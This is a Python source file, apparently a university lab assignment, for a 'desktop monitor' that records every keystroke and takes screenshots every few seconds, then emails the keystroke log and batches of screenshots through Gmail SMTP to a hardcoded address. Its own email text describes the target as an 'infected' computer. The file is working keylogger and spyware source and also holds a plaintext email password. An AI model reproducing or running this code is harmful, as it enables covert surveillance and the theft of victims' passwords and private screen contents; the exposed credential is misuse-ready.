from mss import mss
from pynput.keyboard import Listener
from threading import Timer, Thread
import time
import os

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

"""
This is a class that creates a time interval. That we use for our screenshots.
"""
class TimeInterval(Timer):
  def run(self):
     while not self.finished.wait(self.interval):
        self.function(*self.args, **self.kwargs)

class DesktopMonitor:

   def sending_email_function(self):
       fromemail = "fenika.gostisson@gmail.com"
       toemail = "fenika.gostisson@gmail.com"

       screenshot_counter = 0
       counter = 4
       """While loop so that we continue sending emails"""
       while True:
           """If statement to check that 5 new images have been created before we send a new email"""
           if os.path.exists(('./logs')) and os.path.exists("./logs/sceenshots/screenshot-%s.png" % counter):
               print("I am in", counter)

               """Sending the email:"""
               msg = MIMEMultipart()
               msg['From'] = fromemail
               msg['To'] = toemail
               msg['Subject'] = "Desktop monitor-{}".format(time.time())

               body = "This is an email sent from the computer infected with the desktop monitor.\n\n This program is for educational use. It was made as Lab4 in the course TNM031. \n\n Best Regards jacny980, johgr565"
               msg.attach(MIMEText(body, 'plain'))
               """For loop to attach the 5 images and the keylog file"""
               for f in range(6):
                   if f == 0:
                       filename = "log.txt"
                       attachment = open("./logs/keylogs/log.txt", "rb")

                   elif f > 0:
                       filename = "screenshot-%s.png" % screenshot_counter
                       attachment = open("./logs/sceenshots/screenshot-%s.png" % screenshot_counter, "rb")
                       screenshot_counter += 1
                       print(screenshot_counter)

                   part = MIMEBase('application', 'octet-stream')
                   part.set_payload((attachment).read())
                   encoders.encode_base64(part)
                   part.add_header('Content-Disposition', "attachment; filename =%s" % filename)

                   msg.attach(part)

               """Setting up connection to gmail server"""
               server = smtplib.SMTP('smtp.gmail.com', 587)
               """Logging into email server"""
               server.starttls()
               server.login(msg['From'], "cdlp123!")
               text = msg.as_string()
               server.sendmail(msg['From'], msg['To'], text)
               server.quit()
               counter += 5


   """
  This function saves our keystrokes in a certain format
  """
   def _on_press(self, keypress):
      with open('./logs/keylogs/log.txt', 'a') as f:
          f.write('{}\t\t{}\n'.format(keypress, time.time()))
   """
  This function builds our folder structure if it does not exist and creates the log.txt even if nothing is being written to it
  """
   def _build_log_folders(self):
       if not os.path.exists('./logs'):
           os.mkdir('./logs')
           os.mkdir('./logs/keylogs')
           os.mkdir('./logs/sceenshots')
           f = open('./logs/keylogs/log.txt', "w")
           f.close()
   """
  Our keylogger function that creates the functionality for our _on_press function
  """
   def _keylogger(self):
      with Listener(on_press=self._on_press) as listener:
          listener.join()
    
   """
  Screenshot function
  """
   def _screenshotter(self):
      sct = mss()
      i = 0
      while os.path.exists("./logs/sceenshots/screenshot-%s.png" % i):
          i += 1
      sct.shot(output='./logs/sceenshots/screenshot-%s.png' % i)

   def run(self, interval=3):
       """
     This will launch the keylogger and the screenshot taker on two separate threads.
     We do this so that the keylogger and screenshotter can run at the same time.
     The interval is the amount of time in seconds between each screenshot.
     """
       self._build_log_folders()
       Thread(target=self._keylogger).start()
       TimeInterval(interval, self._screenshotter).start()
       """TimeInterval(interval + 13, self.sending_email_function).start()"""
       self.sending_email_function()


    

if __name__ == '__main__':
   DesktopMonitor = DesktopMonitor()
   DesktopMonitor.run()


